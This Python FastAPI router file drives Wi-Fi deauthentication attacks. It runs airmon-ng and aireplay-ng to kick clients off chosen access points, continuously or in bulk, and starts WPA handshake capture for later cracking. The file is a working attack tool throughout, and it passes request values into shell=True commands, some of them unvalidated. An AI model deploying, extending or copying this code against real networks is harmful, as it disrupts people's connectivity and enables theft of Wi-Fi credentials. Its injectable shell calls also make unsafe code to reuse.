# app/api/deauth.py
from fastapi import APIRouter, Depends, HTTPException, BackgroundTasks
from sqlalchemy.orm import Session
from typing import Optional, List
import subprocess
import time
import re
import threading
from datetime import datetime
from pathlib import Path

from app.db.session import get_db
from app.services.deauth_service import DeauthService
from app.services.capture_service import capture_service
from app.models.target import Target
from app.schemas.deauth import (
    DeauthRequest, 
    BulkDeauthRequest, 
    QueueDeauthRequest,
    FlagDeviceRequest, 
    UpdateStatusRequest,
    DeauthStatus
)

router = APIRouter(prefix="/api/deauth", tags=["deauth"])

# Store active deauth processes
active_deauths = {}
deauth_threads = {}

# ============ Interface Config ============

PHYSICAL_DEAUTH_INTERFACE = "wlan2"
MONITOR_DEAUTH_INTERFACE = "wlan2mon"


# ============ Helper Functions ============

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), 1


def set_interface_channel(interface: str, channel: int) -> bool:
    """
    Set channel on interface. Non-blocking with 3s timeout.
    Returns True if success, False if timed out or failed.
    """
    try:
        proc = subprocess.Popen(
            ["sudo", "iw", "dev", interface, "set", "channel", str(channel)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
        )
        try:
            proc.wait(timeout=3)
            return proc.returncode == 0
        except subprocess.TimeoutExpired:
            proc.kill()
            print(f"⚠️ set channel timed out (interface busy) — skipping")
            return False
    except Exception as e:
        print(f"⚠️ set_interface_channel error: {e}")
        return False


def validate_mac(mac: str) -> bool:
    pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    return bool(re.match(pattern, mac))


def normalize_count(count) -> int:
    """Convert count correctly. 0 stays 0 (continuous)."""
    if count is None:
        return 10
    return int(count)


def ensure_monitor_mode() -> dict:
    """Ensure wlan2 is in monitor mode. Creates wlan2mon if it doesn't exist."""
    monitor_iface = MONITOR_DEAUTH_INTERFACE
    physical_iface = PHYSICAL_DEAUTH_INTERFACE

    stdout, stderr, rc = run_command(f"iwconfig {monitor_iface} 2>&1")
    if rc == 0 and "Mode:Monitor" in stdout:
        print(f"✅ {monitor_iface} already in monitor mode")
        return {"monitor_interface": monitor_iface, "was_created": False}

    stdout, stderr, rc = run_command(f"iwconfig {physical_iface} 2>&1")
    if rc == 0 and "Mode:Monitor" in stdout:
        print(f"✅ {physical_iface} already in monitor mode")
        return {"monitor_interface": physical_iface, "was_created": False}

    print(f"🔧 Enabling monitor mode on {physical_iface}...")
    run_command("sudo airmon-ng check kill")

    stdout, stderr, rc = run_command(f"sudo airmon-ng start {physical_iface}")
    print(f"airmon-ng output: {stdout}")
    print(f"airmon-ng errors: {stderr}")

    if rc != 0:
        raise HTTPException(
            status_code=500,
            detail=f"Failed to enable monitor mode on {physical_iface}: {stderr or stdout}"
        )

    stdout, stderr, rc = run_command(f"iwconfig {monitor_iface} 2>&1")
    if rc == 0 and "Mode:Monitor" in stdout:
        print(f"✅ Monitor mode enabled: {monitor_iface}")
        return {"monitor_interface": monitor_iface, "was_created": True}

    stdout, stderr, rc = run_command(f"iwconfig {physical_iface} 2>&1")
    if rc == 0 and "Mode:Monitor" in stdout:
        print(f"✅ Monitor mode enabled: {physical_iface}")
        return {"monitor_interface": physical_iface, "was_created": True}

    raise HTTPException(
        status_code=500,
        detail=f"Monitor interface not found after airmon-ng start {physical_iface}"
    )


def run_deauth_attack(bssid: str, interface: str, channel: int, client_mac: Optional[str], count: int, db: Optional[Session] = None):
    """
    Run the actual deauth attack in background.
    - Writes aireplay output to log file (avoids PIPE deadlock)
    - Channel is set in /execute BEFORE this function runs
    - DB session is optional (may be closed after request returns)
    """
    try:
        count = normalize_count(count)
        print(f"🔍 Starting deauth on {bssid} (interface: {interface}, count: {count})")

        if client_mac:
            cmd = f"sudo aireplay-ng --deauth {count} -c {client_mac} -a {bssid} {interface}"
        else:
            cmd = f"sudo aireplay-ng --deauth {count} -a {bssid} {interface}"

        print(f"🛠️ Command: {cmd}")

        if count == 0:
            # ⬇️ Continuous deauth → write output to a log file
            deauth_log_dir = Path(__file__).parent.parent.parent / "captures" / "logs"
            deauth_log_dir.mkdir(parents=True, exist_ok=True)

            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_bssid = bssid.replace(":", "-")
            deauth_log = deauth_log_dir / f"deauth_{safe_bssid}_{timestamp}.log"

            print(f"📁 Opening deauth log: {deauth_log}")
            log_handle = open(deauth_log, "w")

            process = subprocess.Popen(
                cmd.split(),
                stdout=log_handle,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
            )

            # ⬇️ Verify it's actually running (not crashed immediately)
            time.sleep(2)
            if process.poll() is not None:
                log_handle.close()
                try:
                    with open(deauth_log, "r") as f:
                        err_output = f.read()
                except:
                    err_output = "(could not read log)"
                print(f"❌ aireplay-ng died! Exit code: {process.returncode}")
                print(f"❌ Output: {err_output}")
                raise Exception(f"aireplay-ng failed: {err_output}")

            print(f"✅ aireplay-ng running (PID: {process.pid})")

            active_deauths[bssid] = {
                "process": process,
                "interface": interface,
                "channel": channel,
                "client_mac": client_mac,
                "start_time": time.time(),
                "running": True,
                "log_file": str(deauth_log),
                "log_handle": log_handle,
            }

            print(f"✅ Continuous deauth started on {bssid} (PID: {process.pid})")

            # Optional DB update (safe if db is None)
            if db is not None:
                try:
                    service = DeauthService(db)
                    service.update_device_status(
                        client_mac=bssid if not client_mac else client_mac,
                        status="deauth_running",
                        notes=f"Deauth attack started on {bssid}"
                    )
                except Exception as e:
                    print(f"⚠️ DB update skipped: {e}")

        else:
            # ⬇️ One-shot deauth → wait for it to complete
            process = subprocess.run(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=60,
            )

            if process.returncode == 0:
                print(f"✅ Deauth completed on {bssid} ({count} packets)")
                if bssid in active_deauths:
                    del active_deauths[bssid]

                if db is not None:
                    try:
                        service = DeauthService(db)
                        service.update_device_status(
                            client_mac=bssid if not client_mac else client_mac,
                            status="deauth_completed",
                            notes=f"Deauth completed: {count} packets sent to {bssid}"
                        )
                    except Exception as e:
                        print(f"⚠️ DB update skipped: {e}")
            else:
                print(f"❌ Deauth failed on {bssid}: {process.stderr}")
                if bssid in active_deauths:
                    del active_deauths[bssid]

    except Exception as e:
        print(f"❌ Error in deauth attack: {e}")
        import traceback
        traceback.print_exc()
        if bssid in active_deauths:
            info = active_deauths.pop(bssid, None)
            if info and info.get("log_handle"):
                try:
                    info["log_handle"].close()
                except:
                    pass


# ============ Device Management ============

@router.post("/flag")
async def flag_device(
    request: FlagDeviceRequest,
    db: Session = Depends(get_db)
):
    service = DeauthService(db)
    return service.flag_device(
        client_mac=request.client_mac,
        reason=request.reason,
        operator=request.operator or "System"
    )


@router.get("/devices")
async def get_devices(
    status: Optional[str] = None,
    search: Optional[str] = None,
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db)
):
    service = DeauthService(db)
    devices = service.get_flagged_devices(status=status, search=search, limit=limit, offset=offset)
    return {"total": len(devices), "devices": devices}


@router.put("/device/{client_mac}/status")
async def update_device_status(
    client_mac: str,
    request: UpdateStatusRequest,
    db: Session = Depends(get_db)
):
    service = DeauthService(db)
    result = service.update_device_status(
        client_mac=client_mac,
        status=request.status,
        notes=request.notes
    )
    if not result.get("success"):
        raise HTTPException(status_code=404, detail=result.get("error"))
    return result


# ============ Deauth Execution ============

@router.post("/execute")
async def execute_deauth(
    request: DeauthRequest,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    """Execute deauth on a device + optional handshake capture."""
    print("=" * 60)
    print("🚀 DEAUTH EXECUTION STARTED")
    print("=" * 60)
    print(f"📡 BSSID: {request.bssid}")
    print(f"📡 Channel: {request.channel}")
    print(f"📡 Count: {request.count}")
    print(f"📡 Capture handshake: {request.capture_handshake}")

    try:
        result = ensure_monitor_mode()
        monitor_iface = result["monitor_interface"]
        print(f"✅ Monitor interface ready: {monitor_iface} (created: {result['was_created']})")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Monitor mode setup failed: {e}")

    if request.client_mac and not validate_mac(request.client_mac):
        raise HTTPException(status_code=400, detail="Invalid client MAC format")

    if request.bssid and not validate_mac(request.bssid):
        raise HTTPException(status_code=400, detail="Invalid BSSID format")

    if request.bssid and request.bssid in active_deauths:
        raise HTTPException(
            status_code=409,
            detail=f"Deauth attack already running on {request.bssid}"
        )

    interface = monitor_iface
    target_channel = request.channel or 1

    # ⬇️ CRITICAL FIX: Set channel ONCE, before airodump/aireplay start
    print(f"📡 Setting channel {target_channel} on {interface} (before attack starts)...")
    channel_ok = set_interface_channel(interface, target_channel)
    if channel_ok:
        print(f"✅ Channel set to {target_channel}")
    else:
        print(f"⚠️ Could not confirm channel {target_channel} — airodump will retry")

    time.sleep(1)

    # Start capture if requested
    capture_info = None
    if request.capture_handshake and request.bssid:
        try:
            capture_info = capture_service.start_capture(
                bssid=request.bssid,
                channel=target_channel,
                interface=monitor_iface,
            )

            target = db.query(Target).filter(Target.bssid == request.bssid).first()
            if target:
                target.handshake = "capturing"
                target.capture_file = capture_info["cap_file"]
                target.capture_log = capture_info["log_file"]
                target.capture_pid = capture_info["pid"]
                target.capture_started_at = datetime.utcnow()
                db.commit()
                print(f"✅ DB updated: {request.bssid} → capturing")
            else:
                print(f"⚠️ Target {request.bssid} not in DB — capture not tracked")
        except Exception as e:
            print(f"❌ Failed to start capture: {e}")

    # ⬇️ Delay so airodump has locked the channel before aireplay starts
    if capture_info:
        time.sleep(1.5)

    # Start deauth (no db — session closed after request)
    background_tasks.add_task(
        run_deauth_attack,
        request.bssid,
        interface,
        target_channel,
        request.client_mac,
        normalize_count(request.count),
    )

    return {
        "success": True,
        "message": f"Deauth attack started on {request.bssid or request.client_mac}",
        "status": "queued",
        "interface": interface,
        "channel": target_channel,
        "channel_set": channel_ok,
        "monitor_created": result["was_created"],
        "capture": capture_info and {
            "started": True,
            "pid": capture_info["pid"],
            "cap_file": capture_info["cap_file"],
            "log_file": capture_info["log_file"],
        } or {"started": False},
    }


# ============ Capture Status ============

@router.get("/capture/status/{bssid}")
async def get_capture_status(bssid: str, db: Session = Depends(get_db)):
    """Check handshake capture status for a BSSID."""
    target = db.query(Target).filter(Target.bssid == bssid).first()
    status = capture_service.get_status(bssid)

    if not status and not target:
        raise HTTPException(status_code=404, detail=f"No capture or target for {bssid}")

    handshake_detected = False
    if target:
        if target.handshake == "captured":
            handshake_detected = True
        elif target.handshake == "capturing":
            handshake_detected = capture_service.check_handshake(bssid, target.capture_log)
            if handshake_detected:
                target.handshake = "captured"
                target.capture_stopped_at = datetime.utcnow()
                db.commit()
                print(f"🎉 Handshake captured for {bssid}!")

    return {
        "bssid": bssid,
        "capturing": status["running"] if status else False,
        "handshake_detected": handshake_detected,
        "elapsed_seconds": status["elapsed_seconds"] if status else None,
        "cap_file": target.capture_file if target else None,
        "log_file": target.capture_log if target else None,
        "db_handshake_status": target.handshake if target else None,
    }


# ============ Bulk / Queue ============

@router.post("/bulk-execute")
async def bulk_execute_deauth(
    request: BulkDeauthRequest,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    result = ensure_monitor_mode()
    interface = result["monitor_interface"]
    target_channel = request.channel or 1

    # ⬇️ Set channel once before any attack
    set_interface_channel(interface, target_channel)
    time.sleep(1)

    results = []
    for client_mac in request.client_macs:
        try:
            background_tasks.add_task(
                run_deauth_attack,
                request.bssid,
                interface,
                target_channel,
                client_mac,
                normalize_count(request.count),
            )
            results.append({"client_mac": client_mac, "success": True, "message": "Deauth queued"})
        except Exception as e:
            results.append({"client_mac": client_mac, "success": False, "message": str(e)})

    return {
        "total": len(results),
        "successful": sum(1 for r in results if r["success"]),
        "failed": sum(1 for r in results if not r["success"]),
        "results": results
    }


@router.post("/queue")
async def queue_deauth(request: QueueDeauthRequest, db: Session = Depends(get_db)):
    service = DeauthService(db)
    return service.queue_deauth(
        client_mac=request.client_mac,
        reason=request.reason,
        operator=request.operator or "System",
        priority=request.priority
    )


@router.post("/queue/process")
async def process_queue(
    limit: int = 10,
    background_tasks: BackgroundTasks = None,
    db: Session = Depends(get_db)
):
    result = ensure_monitor_mode()
    interface = result["monitor_interface"]

    service = DeauthService(db)
    queue_items = service.get_pending_queue(limit=limit)

    for item in queue_items:
        if background_tasks:
            background_tasks.add_task(
                run_deauth_attack,
                item.bssid,
                interface,
                item.channel or 1,
                item.client_mac,
                normalize_count(item.count),
            )
        service.mark_queue_processed(item.id)

    return {"processed": len(queue_items), "remaining": service.get_queue_count()}


# ============ Stats / Logs ============

@router.get("/stats")
async def get_stats(db: Session = Depends(get_db)):
    service = DeauthService(db)
    return service.get_stats()


@router.get("/logs")
async def get_logs(limit: int = 100, offset: int = 0, db: Session = Depends(get_db)):
    service = DeauthService(db)
    logs = service.get_logs(limit=limit, offset=offset)
    return {"total": len(logs), "logs": logs}


# ============ Interface Status ============

@router.get("/interface/status")
async def get_interface_status():
    stdout, stderr, rc = run_command("iwconfig 2>&1")
    interfaces = []
    for line in stdout.split('\n'):
        if line and not line.startswith(' '):
            interfaces.append(line.split()[0])

    stdout, stderr, rc = run_command("iwconfig 2>&1 | grep -i monitor")
    monitor_interfaces = []
    for line in stdout.split('\n'):
        if line and 'Mode:Monitor' in line:
            monitor_interfaces.append(line.split()[0])

    stdout, stderr, rc = run_command("which aireplay-ng")
    aireplay_installed = rc == 0

    deauth_ready = MONITOR_DEAUTH_INTERFACE in monitor_interfaces or PHYSICAL_DEAUTH_INTERFACE in monitor_interfaces

    return {
        "interfaces": interfaces,
        "monitor_interfaces": monitor_interfaces,
        "aireplay_installed": aireplay_installed,
        "deauth_interface": MONITOR_DEAUTH_INTERFACE,
        "deauth_ready": deauth_ready,
        "ready": len(monitor_interfaces) > 0 and aireplay_installed,
        "message": "Ready for deauth" if (len(monitor_interfaces) > 0 and aireplay_installed) else "Not ready"
    }


# ============ AP Management ============

@router.get("/aps")
async def get_aps(
    search: Optional[str] = None,
    limit: int = 100,
    offset: int = 0,
    db: Session = Depends(get_db)
):
    from app.services.deauth.ap_service import DeauthAPService
    service = DeauthAPService(db)
    return service.get_aps(search=search, limit=limit, offset=offset)


@router.get("/aps/{bssid}/clients")
async def get_ap_clients(bssid: str, db: Session = Depends(get_db)):
    from app.services.deauth.ap_service import DeauthAPService
    service = DeauthAPService(db)
    return service.get_ap_clients(bssid)


@router.post("/aps/{bssid}/deauth")
async def deauth_ap(
    bssid: str,
    request: DeauthRequest,
    background_tasks: BackgroundTasks,
    db: Session = Depends(get_db)
):
    result = ensure_monitor_mode()
    interface = result["monitor_interface"]
    target_channel = request.channel or 1

    # ⬇️ Set channel once before any attack
    set_interface_channel(interface, target_channel)
    time.sleep(1)

    from app.services.deauth.ap_service import DeauthAPService
    ap_service = DeauthAPService(db)
    clients = ap_service.get_ap_clients(bssid)

    if not clients or not clients.get("clients"):
        background_tasks.add_task(
            run_deauth_attack,
            bssid,
            interface,
            target_channel,
            None,
            normalize_count(request.count),
        )
        return {
            "success": True,
            "message": f"Broadcast deauth started on AP {bssid}",
            "clients_found": 0,
            "interface": interface,
        }

    client_list = clients.get("clients", [])
    for client in client_list:
        client_mac = client.get("client_mac") or client.get("mac")
        if client_mac:
            background_tasks.add_task(
                run_deauth_attack,
                bssid,
                interface,
                target_channel,
                client_mac,
                normalize_count(request.count),
            )

    return {
        "success": True,
        "message": f"Deauth started on {len(client_list)} clients of AP {bssid}",
        "clients_found": len(client_list),
        "interface": interface,
    }


# ============ Stop ============

@router.post("/stop")
async def stop_deauth(bssid: str, db: Session = Depends(get_db)):
    """Stop deauth + capture for a BSSID."""
    print(f"⏹️ STOP DEAUTH CALLED: {bssid}")

    capture_stopped = capture_service.stop_capture(bssid)
    if capture_stopped:
        print(f"✅ Capture stopped for {bssid}")
        target = db.query(Target).filter(Target.bssid == bssid).first()
        if target:
            target.capture_stopped_at = datetime.utcnow()
            if target.handshake == "capturing":
                target.handshake = (
                    "captured"
                    if capture_service.check_handshake(bssid, target.capture_log)
                    else "failed"
                )
            db.commit()

    if bssid not in active_deauths:
        return {
            "success": True,
            "message": f"No active deauth for {bssid}" + (" (capture stopped)" if capture_stopped else ""),
            "capture_stopped": capture_stopped,
        }

    process_info = active_deauths.pop(bssid, None)
    if not process_info:
        return {
            "success": True,
            "message": f"No active deauth for {bssid}",
            "capture_stopped": capture_stopped,
        }

    process = process_info.get("process")
    log_handle = process_info.get("log_handle")

    try:
        if process and process.poll() is None:
            process.terminate()
            time.sleep(1)
            if process.poll() is None:
                process.kill()

        if log_handle:
            try:
                log_handle.close()
            except:
                pass

        print(f"✅ Deauth stopped for {bssid}")

        return {
            "success": True,
            "message": f"Deauth stopped on {bssid}",
            "capture_stopped": capture_stopped,
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error stopping deauth: {str(e)}")


@router.get("/active")
async def get_active_deauths():
    status = []
    for bssid, info in active_deauths.items():
        process = info.get("process")
        running = False
        if process:
            process.poll()
            running = process.returncode is None

        status.append({
            "bssid": bssid,
            "running": running,
            "interface": info.get("interface"),
            "channel": info.get("channel"),
            "client_mac": info.get("client_mac"),
            "start_time": info.get("start_time"),
            "log_file": info.get("log_file"),
            "duration": time.time() - info.get("start_time", time.time()) if info.get("start_time") else 0
        })

    return {"active_deauths": status, "total": len(status)}